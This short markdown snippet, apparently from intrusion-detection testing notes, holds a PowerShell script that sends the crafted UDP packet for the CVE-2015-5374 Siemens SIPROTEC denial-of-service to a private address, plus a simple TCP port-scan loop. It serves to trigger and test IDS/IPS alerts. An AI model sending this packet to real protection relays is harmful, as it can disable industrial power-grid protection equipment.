## To test Intrusion Detection/Prevention functionality

**CVE-2015-5374 Siemens SIPROTEC Denial-of-Service Vulnerability**
```powershell
[System.Byte[]] $ByteArray=0x11,0x49,0x00,0x00,0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x28,0x9e
$UdpClient = New-Object System.Net.Sockets.UdpClient
$UdpClient.Connect("192.168.127.56", 50000)
$UdpClient.Send($ByteArray, $ByteArray.length) | out-null
```

**TCP Port SYN Scan**
```powershell
foreach ($p in 1..20) { 
New-Object System.Net.Sockets.TCPClient('192.168.127.56',$p) 
}
```
